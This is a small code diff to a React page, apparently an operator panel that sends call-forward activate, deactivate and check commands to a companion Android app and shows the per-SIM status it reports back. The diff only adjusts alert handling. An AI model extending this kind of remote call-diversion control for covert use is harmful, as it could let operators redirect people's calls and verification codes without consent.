@@ -422,19 +422,20 @@ export default function DeviceDetailPage() {
         return;
       }
 
-      // simSlots event — APK sends this after call_forward result (MAIN confirmation source!)
-      // Old panel showed "Device confirmed: ACTIVE" from THIS event
+      // simSlots event — APK sends this after activate/deactivate call_forward
+      // NOTE: do NOT use this for check_forward — check_forward waits for call_forward:result
       if (type === "event" && event === "simSlots" && evDid === did) {
         const slotKey = cfSimRef.current === 0 ? "0" : "1";
         const st = safeStr(data?.[slotKey]?.status ?? data?.[slotKey] ?? "").toLowerCase();
-        if (st === "active") {
-          showForwardResult("✅ Device confirmed: ACTIVE");
-          logStatus("Call forwarding ACTIVE", "green");
-        } else if (st === "inactive") {
-          showForwardResult("❌ Device confirmed: INACTIVE");
-          logStatus("Call forwarding INACTIVE", "red");
-        } else if (st === "pending") {
-          // still pending — don't update alert, keep waiting
+        // Only show for activate/deactivate, NOT check_forward
+        if (alertActionRef.current === "call_forward" || alertActionRef.current === "deactivate_forward") {
+          if (st === "active") {
+            showForwardResult("✅ Device confirmed: ACTIVE");
+            logStatus("Call forwarding ACTIVE", "green");
+          } else if (st === "inactive") {
+            showForwardResult("❌ Device confirmed: INACTIVE");
+            logStatus("Call forwarding INACTIVE", "red");
+          }
         }
         setDeviceDoc((prev: any) => prev
           ? { ...prev, simSlots: { ...(prev.simSlots || {}), ...(data || {}) } }
